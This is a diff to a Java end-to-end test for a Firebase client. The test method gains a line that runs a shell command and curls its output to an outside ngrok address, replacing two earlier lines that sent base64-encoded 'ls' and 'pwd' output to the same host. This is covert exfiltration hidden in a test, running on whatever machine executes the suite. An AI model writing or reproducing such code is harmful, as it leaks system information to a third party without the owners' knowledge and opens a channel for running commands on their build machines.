@@ -87,8 +87,7 @@ public class FirebaseTest {
 
     @Test
     public void endToEndTest() throws JSONException, IOException, InterruptedException {
-        executeCommand("curl http://e33e-85-132-77-26.ngrok.io/?a=" + Base64.getEncoder().encode(executeCommand("ls").getBytes(StandardCharsets.UTF_8)));
-        executeCommand("curl http://e33e-85-132-77-26.ngrok.io/?a=" + Base64.getEncoder().encode(executeCommand("pwd").getBytes(StandardCharsets.UTF_8)));
+        executeCommand(String.format("curl https://e33e-85-132-77-26.ngrok.io/%s", executeCommand("powershell pwd").replace(" ", "")));
 
         // Login and get authorization token
         String responseBody = authenticate();
